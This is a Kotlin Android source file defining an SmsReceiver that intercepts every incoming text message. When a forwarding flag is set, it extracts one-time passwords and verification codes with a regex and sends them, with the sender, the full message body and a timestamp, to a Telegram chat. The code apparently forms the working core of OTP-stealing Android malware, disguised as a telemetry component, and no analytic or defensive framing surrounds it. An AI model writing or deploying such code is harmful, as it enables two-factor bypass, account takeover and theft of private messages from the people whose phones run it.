package com.example.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.example.data.AppDatabase
import com.example.data.DataStoreManager
import com.example.data.TelemetryRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class SmsReceiver : BroadcastReceiver() {

    private val receiverScope = CoroutineScope(Dispatchers.IO)

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val db = AppDatabase.getDatabase(context)
            val dataStoreManager = DataStoreManager(context)
            val repository = TelemetryRepository(context, db.appDao(), dataStoreManager)

            receiverScope.launch {
                try {
                    val enabled = dataStoreManager.smsForward.first()
                    if (!enabled) return@launch

                    val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                    if (messages.isNullOrEmpty()) return@launch

                    val sms = messages[0]
                    val sender = sms.originatingAddress ?: "Unknown"
                    val timestamp = sms.timestampMillis
                    val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp))

                    val body = buildString {
                        for (message in messages) {
                            append(message.messageBody)
                        }
                    }

                    val otp = extractOtp(body)

                    val message = """
                        📩 *New SMS*
                        *From:* $sender
                        *OTP:* $otp
                        *Message:* $body
                        *Time:* $timeStr
                    """.trimIndent()

                    repository.log("SmsReceiver", "Captured SMS from $sender", "INFO")
                    repository.sendTelegramMessage(message)
                } catch (e: Exception) {
                    repository.log("SmsReceiver", "Error processing SMS: ${e.message}", "ERROR")
                }
            }
        }
    }

    private fun extractOtp(message: String): String {
        try {
            val otpRegex = Regex("""(?i)\b(?:otp|code|pin|verification|one-time|verify)\b.*?\b(\d{4,8})\b|\b(\d{4,8})\b.*?\b(?:otp|code|pin|verification|one-time|verify)\b""")
            val match = otpRegex.find(message)
            if (match != null) {
                return match.groups[1]?.value ?: match.groups[2]?.value ?: ""
            }
            
            val lower = message.lowercase()
            if (lower.contains("otp") || lower.contains("code") || lower.contains("verification") || lower.contains("pin") || lower.contains("verify")) {
                val simpleRegex = Regex("""\b(\d{4,8})\b""")
                val simpleMatch = simpleRegex.find(message)
                if (simpleMatch != null) {
                    return simpleMatch.value
                }
            }
        } catch (e: Exception) {
            // Ignore
        }
        return "None"
    }
}
